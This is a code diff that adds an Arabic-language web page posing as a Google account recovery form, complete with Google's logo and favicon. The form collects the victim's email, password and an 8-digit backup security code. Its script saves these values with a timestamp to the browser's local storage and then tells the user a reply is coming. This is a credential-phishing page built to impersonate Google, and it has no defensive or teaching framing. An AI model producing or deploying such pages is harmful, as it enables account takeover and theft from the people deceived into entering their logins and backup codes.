@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>استرداد الحساب - Google</title>
+  <link rel="icon" href="https://www.google.com/favicon.ico" />
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Roboto', Arial, sans-serif;
+      background-color: #f1f3f4;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .container {
+      background-color: #ffffff;
+      width: 100%;
+      max-width: 400px;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+    }
+
+    .logo {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+
+    .logo img {
+      width: 75px;
+    }
+
+    h2 {
+      text-align: center;
+      font-weight: 500;
+      color: #202124;
+      margin-bottom: 24px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 6px;
+      color: #5f6368;
+      font-size: 14px;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 20px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      font-size: 16px;
+      transition: border 0.3s ease;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #4285f4;
+      box-shadow: 0 0 2px #4285f4;
+    }
+
+    .button {
+      width: 100%;
+      background-color: #1a73e8;
+      color: white;
+      padding: 12px;
+      font-size: 16px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .button:hover {
+      background-color: #1669c1;
+    }
+
+    .link-button {
+      background: none;
+      color: #1a73e8;
+      border: none;
+      cursor: pointer;
+      margin-top: 10px;
+      font-size: 14px;
+      text-decoration: underline;
+      display: block;
+      width: 100%;
+      text-align: center;
+    }
+
+    .message, .error-message {
+      text-align: center;
+      font-size: 16px;
+      margin-top: 15px;
+      display: none;
+    }
+
+    .message {
+      color: green;
+    }
+
+    .error-message {
+      color: red;
+    }
+
+    @media (max-width: 480px) {
+      .container {
+        padding: 25px 20px;
+      }
+
+      input, .button {
+        font-size: 14px;
+        padding: 10px;
+      }
+
+      h2 {
+        font-size: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google logo" />
+    </div>
+    <h2>استرداد الحساب</h2>
+    <form id="recoveryForm">
+      <label for="email">البريد الإلكتروني</label>
+      <input type="email" id="email" placeholder="example@gmail.com" required />
+    
+      <label for="password">كلمة المرور</label>
+      <input type="password" id="password" placeholder="أدخل كلمة المرور" required />
+    
+      <label for="securityCode">رمز الأمان الاحتياطي (8 أرقام فقط)</label>
+      <input type="text" id="securityCode" placeholder="أدخل الرمز هنا" required />
+    
+      <button type="submit" class="button">إرسال</button>
+      <button type="button" class="link-button" onclick="window.location.href='الصور.html'">
+        كيف يمكنني الحصول على رمز الأمان؟
+      </button>
+    </form>
+    <p class="message" id="successMessage">سيتم الرد عليك قريبًا!</p>
+    <p class="error-message" id="errorMessage">حدث خطأ: رمز الأمان يجب أن يتكون من 8 أرقام فقط!</p>
+  </div>
+
+  <script>
+    let previousSecurityCode = "";
+
+    document.getElementById('recoveryForm').addEventListener('submit', function (e) {
+      e.preventDefault();
+
+      const email = document.getElementById('email').value.trim();
+      const securityCode = document.getElementById('securityCode').value.trim();
+      const successMessage = document.getElementById('successMessage');
+      const errorMessage = document.getElementById('errorMessage');
+
+      if (securityCode.length !== 8 || isNaN(securityCode)) {
+        errorMessage.textContent = "حدث خطأ: رمز الأمان يجب أن يتكون من 8 أرقام فقط!";
+        errorMessage.style.display = 'block';
+        setTimeout(() => errorMessage.style.display = 'none', 3000);
+        return;
+      }
+
+      if (securityCode === previousSecurityCode) {
+        errorMessage.textContent = "حدث خطأ: رمز الأمان مكرر!";
+        errorMessage.style.display = 'block';
+        setTimeout(() => errorMessage.style.display = 'none', 2000);
+        return;
+      }
+
+      previousSecurityCode = securityCode;
+
+      const entry = { email, password: document.getElementById('password').value, securityCode, time: new Date().toLocaleString() };
+      let dataList = JSON.parse(localStorage.getItem('entries') || '[]');
+      dataList.push(entry);
+      localStorage.setItem('entries', JSON.stringify(dataList));
+
+      successMessage.style.display = 'block';
+      setTimeout(() => successMessage.style.display = 'none', 2000);
+    });
+  </script>
+</body>
+</html>
